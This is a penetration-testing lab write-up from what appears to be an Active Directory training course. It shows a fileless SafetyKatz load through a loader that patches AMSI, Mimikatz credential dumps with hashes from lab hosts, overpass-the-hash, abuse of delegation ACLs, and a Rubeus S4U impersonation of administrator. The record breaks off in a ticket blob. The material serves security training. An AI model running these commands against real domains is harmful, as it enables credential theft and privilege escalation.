# HANDS-ON 13:

```

- Find a computer object in US domain where we have Write permissions.
- Abuse the Write permissions to access that computer as Domain Admin.
- Extract secrets from that machine for users and hunt for local admin privileges for the users.

```


## Index of content

  1. [Write Permissions](#find-computer)
  2. [Abuse Permissions](#abuse-permissions)
  3. [Extract Secrets](#extract-secrets)

Extract credentials from us-mgmt machine:

copy Loader.ex fromm attacker machine to target machine:
```
C:\Windows\system32>echo F | xcopy C:\AD\Tools\Loader.exe \\us-mgmt\C$\Users\Public\Loader.exe /Y
Does \\us-mgmt\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied

```
Access to target machine us-mgmt:
```
C:\Windows\system32>winrs -r:us-mgmt cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.
```

create port proxy:
```
C:\Users\studentuser17>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.17
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.17

```

webserver on the attacker machine side:
```
C:\AD\Tools>python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
192.168.1.31 - - [20/Feb/2023 11:14:06] "GET /SafetyKatz.exe HTTP/1.1" 200 -
```
Load fileless Safetykatz from the attacker machine:

```
C:\Users\studentuser17>C:\Users\Public\Loader.exe -path  http://127.0.0.1:8080/SafetyKatz.exe
C:\Users\Public\Loader.exe -path  http://127.0.0.1:8080/SafetyKatz.exe
[+] Successfully unhooked ETW!
[+] Successfully patched AMSI!
[+] URL/PATH : http://127.0.0.1:8080/SafetyKatz.exe Arguments :

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # -path
```
Dump credentials:
```
mimikatz # sekurlsa::keys

Authentication Id : 0 ; 1757682 (00000000:001ad1f2)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 3:07:49 AM
SID               : S-1-5-90-0-2

         * Username : US-MGMT$
         * Domain   : us.techcorp.local
         * Password : 5k:=71Bwt*<iIqp"P\p5DgsJ[^j=i,<;kKSe1hB;qSVkUMqHQ1Ky$vJ?r]#;0bKdotMJHd@L#&.Aaz\@2ml@a+@0c<GYHOyubBK$7JEm6o]6\PLZS-ar3GKM
         * Key List :
           aes256_hmac       a482f25201274e7b6088680d0159895ddba763cab7ddf736ec9bd9919c697cca
           aes128_hmac       31e8df3539171e9dd6ab71b04408492a
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

Authentication Id : 0 ; 1752836 (00000000:001abf04)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 3:07:49 AM
SID               : S-1-5-96-0-2

         * Username : US-MGMT$
         * Domain   : us.techcorp.local
         * Password : 5k:=71Bwt*<iIqp"P\p5DgsJ[^j=i,<;kKSe1hB;qSVkUMqHQ1Ky$vJ?r]#;0bKdotMJHd@L#&.Aaz\@2ml@a+@0c<GYHOyubBK$7JEm6o]6\PLZS-ar3GKM
         * Key List :
           aes256_hmac       a482f25201274e7b6088680d0159895ddba763cab7ddf736ec9bd9919c697cca
           aes128_hmac       31e8df3539171e9dd6ab71b04408492a
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

Authentication Id : 0 ; 49528 (00000000:0000c178)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 2:39:02 AM
SID               : S-1-5-90-0-1

         * Username : US-MGMT$
         * Domain   : us.techcorp.local
         * Password : 5k:=71Bwt*<iIqp"P\p5DgsJ[^j=i,<;kKSe1hB;qSVkUMqHQ1Ky$vJ?r]#;0bKdotMJHd@L#&.Aaz\@2ml@a+@0c<GYHOyubBK$7JEm6o]6\PLZS-ar3GKM
         * Key List :
           aes256_hmac       a482f25201274e7b6088680d0159895ddba763cab7ddf736ec9bd9919c697cca
           aes128_hmac       31e8df3539171e9dd6ab71b04408492a
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

Authentication Id : 0 ; 29411 (00000000:000072e3)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 2:39:01 AM
SID               : S-1-5-96-0-1

         * Username : US-MGMT$
         * Domain   : us.techcorp.local
         * Password : 5k:=71Bwt*<iIqp"P\p5DgsJ[^j=i,<;kKSe1hB;qSVkUMqHQ1Ky$vJ?r]#;0bKdotMJHd@L#&.Aaz\@2ml@a+@0c<GYHOyubBK$7JEm6o]6\PLZS-ar3GKM
         * Key List :
           aes256_hmac       a482f25201274e7b6088680d0159895ddba763cab7ddf736ec9bd9919c697cca
           aes128_hmac       31e8df3539171e9dd6ab71b04408492a
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

Authentication Id : 0 ; 49593 (00000000:0000c1b9)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 2:39:02 AM
SID               : S-1-5-90-0-1

         * Username : US-MGMT$
         * Domain   : us.techcorp.local
         * Password : 5k:=71Bwt*<iIqp"P\p5DgsJ[^j=i,<;kKSe1hB;qSVkUMqHQ1Ky$vJ?r]#;0bKdotMJHd@L#&.Aaz\@2ml@a+@0c<GYHOyubBK$7JEm6o]6\PLZS-ar3GKM
         * Key List :
           aes256_hmac       a482f25201274e7b6088680d0159895ddba763cab7ddf736ec9bd9919c697cca
           aes128_hmac       31e8df3539171e9dd6ab71b04408492a
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

Authentication Id : 0 ; 29447 (00000000:00007307)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 2:39:01 AM
SID               : S-1-5-96-0-0

         * Username : US-MGMT$
         * Domain   : us.techcorp.local
         * Password : 5k:=71Bwt*<iIqp"P\p5DgsJ[^j=i,<;kKSe1hB;qSVkUMqHQ1Ky$vJ?r]#;0bKdotMJHd@L#&.Aaz\@2ml@a+@0c<GYHOyubBK$7JEm6o]6\PLZS-ar3GKM
         * Key List :
           aes256_hmac       a482f25201274e7b6088680d0159895ddba763cab7ddf736ec9bd9919c697cca
           aes128_hmac       31e8df3539171e9dd6ab71b04408492a
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : US-MGMT$
Domain            : US
Logon Server      : (null)
Logon Time        : 12/26/2022 2:39:01 AM
SID               : S-1-5-18

         * Username : us-mgmt$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e99e74d74016ed51b2
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

Authentication Id : 0 ; 1941534 (00000000:001da01e)
Session           : RemoteInteractive from 2
User Name         : mgmtadmin
Domain            : US
Logon Server      : US-DC
Logon Time        : 12/26/2022 3:22:24 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1115

         * Username : mgmtadmin
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f
           rc4_hmac_nt       e53153fc2dc8d4c5a5839e46220717e5
           rc4_hmac_old      e53153fc2dc8d4c5a5839e46220717e5
           rc4_md4           e53153fc2dc8d4c5a5839e46220717e5
           rc4_hmac_nt_exp   e53153fc2dc8d4c5a5839e46220717e5
           rc4_hmac_old_exp  e53153fc2dc8d4c5a5839e46220717e5

Authentication Id : 0 ; 1941475 (00000000:001d9fe3)
Session           : RemoteInteractive from 2
User Name         : mgmtadmin
Domain            : US
Logon Server      : US-DC
Logon Time        : 12/26/2022 3:22:24 AM
SID               : S-1-5-21-210670787-2521448726-163245708-1115

         * Username : mgmtadmin
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f
           rc4_hmac_nt       e53153fc2dc8d4c5a5839e46220717e5
           rc4_hmac_old      e53153fc2dc8d4c5a5839e46220717e5
           rc4_md4           e53153fc2dc8d4c5a5839e46220717e5
           rc4_hmac_nt_exp   e53153fc2dc8d4c5a5839e46220717e5
           rc4_hmac_old_exp  e53153fc2dc8d4c5a5839e46220717e5

Authentication Id : 0 ; 1757636 (00000000:001ad1c4)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 3:07:49 AM
SID               : S-1-5-90-0-2

         * Username : US-MGMT$
         * Domain   : us.techcorp.local
         * Password : 5k:=71Bwt*<iIqp"P\p5DgsJ[^j=i,<;kKSe1hB;qSVkUMqHQ1Ky$vJ?r]#;0bKdotMJHd@L#&.Aaz\@2ml@a+@0c<GYHOyubBK$7JEm6o]6\PLZS-ar3GKM
         * Key List :
           aes256_hmac       a482f25201274e7b6088680d0159895ddba763cab7ddf736ec9bd9919c697cca
           aes128_hmac       31e8df3539171e9dd6ab71b04408492a
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : US-MGMT$
Domain            : US
Logon Server      : (null)
Logon Time        : 12/26/2022 2:39:02 AM
SID               : S-1-5-20

         * Username : us-mgmt$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e99e74d74016ed51b2
           rc4_hmac_nt       fae951131d684b3318f524c535d36fb2
           rc4_hmac_old      fae951131d684b3318f524c535d36fb2
           rc4_md4           fae951131d684b3318f524c535d36fb2
           rc4_hmac_nt_exp   fae951131d684b3318f524c535d36fb2
           rc4_hmac_old_exp  fae951131d684b3318f524c535d36fb2

mimikatz #

```
## Write Permissions
Looking for acls for the new user mgmtadmin:
```
PS C:\AD\Tools> . C:\AD\Tools\PowerView.ps1
PS C:\AD\Tools> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin'}
WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a
distinguishedname with Convert-ADName
WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a
distinguishedname with Convert-ADName
WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a
distinguishedname with Convert-ADName


ObjectDN                : CN=US-HELPDESK,CN=Computers,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1115
IdentityReferenceName   : mgmtadmin
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=mgmtadmin,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : user



```

## Abuse Permissions
Create new impersonate session with pass the hash using the aes256 mgmtadmin credentials:
```
mimikatz # sekurlsa::opassth /domain:us.techcorp.local /user:mgmtadmin /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /run:cmd.exe
user    : mgmtadmin
domain  : us.techcorp.local
program : cmd.exe
impers. : no
AES256  : 32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f
  |  PID  6096
  |  TID  5624
  |  LSA Process is now R/W
  |  LUID 0 ; 26587766 (00000000:0195b276)
  \_ msv1_0   - data copy @ 000002325CCE33B0 : OK !
  \_ kerberos - data copy @ 000002325D06D6B8
   \_ aes256_hmac       OK
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       -> null
   \_ rc4_hmac_old      -> null
   \_ rc4_md4           -> null
   \_ rc4_hmac_nt_exp   -> null
   \_ rc4_hmac_old_exp  -> null
   \_ *Password replace @ 000002325C6E55B8 (32) -> null

```
```
C:\Windows\system32>whoami
us\studentuser17

C:\Windows\system32>kalist
'kalist' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32>klist

Current LogonId is 0:0x195b276

Cached Tickets: (0)
```
Abusse of ACLS:

```
C:\Windows\system32>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

C:\Windows\system32>set COR_ENABLE_PROFILING=1

C:\Windows\system32>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.

C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
The operation completed successfully.

C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\AD\Tools\InviShell\InShellProf.dll" /f
The operation completed successfully.

C:\Windows\system32>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

```

```
PS C:\Windows\system32> $comps = 'student1$','student11$','student12$','student13$','student14$','student15$', 'student16$','student17$','student18$','student19$','student20$','student21$','student22$','student1$','student24$','student25$','student26$','student27$','student28$','student29$','student30$'
PS C:\Windows\system32> Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps -Verbose
VERBOSE: Performing the operation "Set" on target "CN=US-HELPDESK,CN=Computers,DC=us,DC=techcorp,DC=local".
```

## Extract Secrets
Extract machine studentuser17 hash of system user [SID S-1-5-18]:
```

Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>C:\AD\Tools\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::keys

Authentication Id : 0 ; 25459565 (00000000:01847b6d)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/20/2023 11:09:50 AM
SID               : S-1-5-90-0-3

         * Username : STUDENT17$
         * Domain   : us.techcorp.local
         * Password : Z^NIHcYS uzq$ty4NG=]XuN x`2O<L",_k#Rj9"6G3a-xM=J2&qEq[KbWj@bO7iQr>C#hhZqKZnV2uysSw7pFkc!Ik\_h7&q: n(x\oq<]'*`ruC/FHQ!usO
         * Key List :
           aes256_hmac       a6836406f0142332aa1539dfba1ac047548a5a2bf388aa83e08182b31ef870b4
           aes128_hmac       74717db61f2d4455c5b5b1611d36f4b5
           rc4_hmac_nt       bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_old      bca76bfd071cc0a82033132dbededfcd
           rc4_md4           bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_nt_exp   bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_old_exp  bca76bfd071cc0a82033132dbededfcd

Authentication Id : 0 ; 25458079 (00000000:0184759f)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/20/2023 11:09:50 AM
SID               : S-1-5-96-0-3

         * Username : STUDENT17$
         * Domain   : us.techcorp.local
         * Password : Z^NIHcYS uzq$ty4NG=]XuN x`2O<L",_k#Rj9"6G3a-xM=J2&qEq[KbWj@bO7iQr>C#hhZqKZnV2uysSw7pFkc!Ik\_h7&q: n(x\oq<]'*`ruC/FHQ!usO
         * Key List :
           aes256_hmac       a6836406f0142332aa1539dfba1ac047548a5a2bf388aa83e08182b31ef870b4
           aes128_hmac       74717db61f2d4455c5b5b1611d36f4b5
           rc4_hmac_nt       bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_old      bca76bfd071cc0a82033132dbededfcd
           rc4_md4           bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_nt_exp   bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_old_exp  bca76bfd071cc0a82033132dbededfcd

Authentication Id : 0 ; 49456 (00000000:0000c130)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/18/2023 3:44:12 PM
SID               : S-1-5-90-0-1

         * Username : STUDENT17$
         * Domain   : us.techcorp.local
         * Password : Z^NIHcYS uzq$ty4NG=]XuN x`2O<L",_k#Rj9"6G3a-xM=J2&qEq[KbWj@bO7iQr>C#hhZqKZnV2uysSw7pFkc!Ik\_h7&q: n(x\oq<]'*`ruC/FHQ!usO
         * Key List :
           aes256_hmac       a6836406f0142332aa1539dfba1ac047548a5a2bf388aa83e08182b31ef870b4
           aes128_hmac       74717db61f2d4455c5b5b1611d36f4b5
           rc4_hmac_nt       bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_old      bca76bfd071cc0a82033132dbededfcd
           rc4_md4           bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_nt_exp   bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_old_exp  bca76bfd071cc0a82033132dbededfcd

Authentication Id : 0 ; 29897 (00000000:000074c9)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/18/2023 3:44:12 PM
SID               : S-1-5-96-0-1

         * Username : STUDENT17$
         * Domain   : us.techcorp.local
         * Password : Z^NIHcYS uzq$ty4NG=]XuN x`2O<L",_k#Rj9"6G3a-xM=J2&qEq[KbWj@bO7iQr>C#hhZqKZnV2uysSw7pFkc!Ik\_h7&q: n(x\oq<]'*`ruC/FHQ!usO
         * Key List :
           aes256_hmac       a6836406f0142332aa1539dfba1ac047548a5a2bf388aa83e08182b31ef870b4
           aes128_hmac       74717db61f2d4455c5b5b1611d36f4b5
           rc4_hmac_nt       bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_old      bca76bfd071cc0a82033132dbededfcd
           rc4_md4           bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_nt_exp   bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_old_exp  bca76bfd071cc0a82033132dbededfcd

Authentication Id : 0 ; 26587766 (00000000:0195b276)
Session           : NewCredentials from 0
User Name         : studentuser17
Domain            : US
Logon Server      : (null)
Logon Time        : 2/20/2023 11:43:55 AM
SID               : S-1-5-21-210670787-2521448726-163245708-16107

         * Username : mgmtadmin
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f
           null              <no size, buffer is incorrect>
           null              <no size, buffer is incorrect>
           null              <no size, buffer is incorrect>
           null              <no size, buffer is incorrect>
           null              <no size, buffer is incorrect>
           null              <no size, buffer is incorrect>

Authentication Id : 0 ; 49433 (00000000:0000c119)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/18/2023 3:44:12 PM
SID               : S-1-5-90-0-1

         * Username : STUDENT17$
         * Domain   : us.techcorp.local
         * Password : Z^NIHcYS uzq$ty4NG=]XuN x`2O<L",_k#Rj9"6G3a-xM=J2&qEq[KbWj@bO7iQr>C#hhZqKZnV2uysSw7pFkc!Ik\_h7&q: n(x\oq<]'*`ruC/FHQ!usO
         * Key List :
           aes256_hmac       a6836406f0142332aa1539dfba1ac047548a5a2bf388aa83e08182b31ef870b4
           aes128_hmac       74717db61f2d4455c5b5b1611d36f4b5
           rc4_hmac_nt       bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_old      bca76bfd071cc0a82033132dbededfcd
           rc4_md4           bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_nt_exp   bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_old_exp  bca76bfd071cc0a82033132dbededfcd

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : STUDENT17$
Domain            : US
Logon Server      : (null)
Logon Time        : 2/18/2023 3:44:11 PM
SID               : S-1-5-18

         * Username : student17$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       47054c261e84434a9491465fba6cbea2efea6b8acf99e52054746d44f5d1f35d
           rc4_hmac_nt       bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_old      bca76bfd071cc0a82033132dbededfcd
           rc4_md4           bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_nt_exp   bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_old_exp  bca76bfd071cc0a82033132dbededfcd

Authentication Id : 0 ; 25477393 (00000000:0184c111)
Session           : RemoteInteractive from 3
User Name         : studentuser17
Domain            : US
Logon Server      : US-DC
Logon Time        : 2/20/2023 11:09:52 AM
SID               : S-1-5-21-210670787-2521448726-163245708-16107

         * Username : studentuser17
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       77884f1700e493d5bb4335d0cbaabe506dee8fed1fb1d2f06344047d04099199
           rc4_hmac_nt       8f4ae466eb08f7e8c8f4dd9ec2a2caa1
           rc4_hmac_old      8f4ae466eb08f7e8c8f4dd9ec2a2caa1
           rc4_md4           8f4ae466eb08f7e8c8f4dd9ec2a2caa1
           rc4_hmac_nt_exp   8f4ae466eb08f7e8c8f4dd9ec2a2caa1
           rc4_hmac_old_exp  8f4ae466eb08f7e8c8f4dd9ec2a2caa1

Authentication Id : 0 ; 25459515 (00000000:01847b3b)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/20/2023 11:09:50 AM
SID               : S-1-5-90-0-3

         * Username : STUDENT17$
         * Domain   : us.techcorp.local
         * Password : Z^NIHcYS uzq$ty4NG=]XuN x`2O<L",_k#Rj9"6G3a-xM=J2&qEq[KbWj@bO7iQr>C#hhZqKZnV2uysSw7pFkc!Ik\_h7&q: n(x\oq<]'*`ruC/FHQ!usO
         * Key List :
           aes256_hmac       a6836406f0142332aa1539dfba1ac047548a5a2bf388aa83e08182b31ef870b4
           aes128_hmac       74717db61f2d4455c5b5b1611d36f4b5
           rc4_hmac_nt       bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_old      bca76bfd071cc0a82033132dbededfcd
           rc4_md4           bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_nt_exp   bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_old_exp  bca76bfd071cc0a82033132dbededfcd

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : STUDENT17$
Domain            : US
Logon Server      : (null)
Logon Time        : 2/18/2023 3:44:12 PM
SID               : S-1-5-20

         * Username : student17$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       47054c261e84434a9491465fba6cbea2efea6b8acf99e52054746d44f5d1f35d
           rc4_hmac_nt       bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_old      bca76bfd071cc0a82033132dbededfcd
           rc4_md4           bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_nt_exp   bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_old_exp  bca76bfd071cc0a82033132dbededfcd

Authentication Id : 0 ; 29803 (00000000:0000746b)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/18/2023 3:44:12 PM
SID               : S-1-5-96-0-0

         * Username : STUDENT17$
         * Domain   : us.techcorp.local
         * Password : Z^NIHcYS uzq$ty4NG=]XuN x`2O<L",_k#Rj9"6G3a-xM=J2&qEq[KbWj@bO7iQr>C#hhZqKZnV2uysSw7pFkc!Ik\_h7&q: n(x\oq<]'*`ruC/FHQ!usO
         * Key List :
           aes256_hmac       a6836406f0142332aa1539dfba1ac047548a5a2bf388aa83e08182b31ef870b4
           aes128_hmac       74717db61f2d4455c5b5b1611d36f4b5
           rc4_hmac_nt       bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_old      bca76bfd071cc0a82033132dbededfcd
           rc4_md4           bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_nt_exp   bca76bfd071cc0a82033132dbededfcd
           rc4_hmac_old_exp  bca76bfd071cc0a82033132dbededfcd

Authentication Id : 0 ; 25477084 (00000000:0184bfdc)
Session           : RemoteInteractive from 3
User Name         : studentuser17
Domain            : US
Logon Server      : US-DC
Logon Time        : 2/20/2023 11:09:52 AM
SID               : S-1-5-21-210670787-2521448726-163245708-16107

         * Username : studentuser17
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       77884f1700e493d5bb4335d0cbaabe506dee8fed1fb1d2f06344047d04099199
           rc4_hmac_nt       8f4ae466eb08f7e8c8f4dd9ec2a2caa1
           rc4_hmac_old      8f4ae466eb08f7e8c8f4dd9ec2a2caa1
           rc4_md4           8f4ae466eb08f7e8c8f4dd9ec2a2caa1
           rc4_hmac_nt_exp   8f4ae466eb08f7e8c8f4dd9ec2a2caa1
           rc4_hmac_old_exp  8f4ae466eb08f7e8c8f4dd9ec2a2caa1

mimikatz #
```
Impersonate user admministrator of us-helpdesk with rubeus and machine student17$ ases256 hash, and access to the target machine: 
```
C:\AD\Tools\Rubeus.exe s4u /user:student17$ /aes256:47054c261e84434a9491465fba6cbea2efea6b8acf99e52054746d44f5d1f35d /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: 47054c261e84434a9491465fba6cbea2efea6b8acf99e52054746d44f5d1f35d
[*] Building AS-REQ (w/ preauth) for: 'us.techcorp.local\student17$'
[*] Using domain controller: 192.168.1.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFzDCCBcigAwIBBaEDAgEWooIEwDCCBLxhggS4MIIEtKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FM
      oiYwJKADAgECoR0wGxsGa3JidGd0GxF1cy50ZWNoY29ycC5sb2NhbKOCBG4wggRqoAMCARKhAwIBAqKC
      BFwEggRYStWiGtyMX08qS9yf0pDJoy4kCWeCohsfUm5K4PYGjIsdu7q24CXNsNRdb5XQHU6EXa4vh6Kf
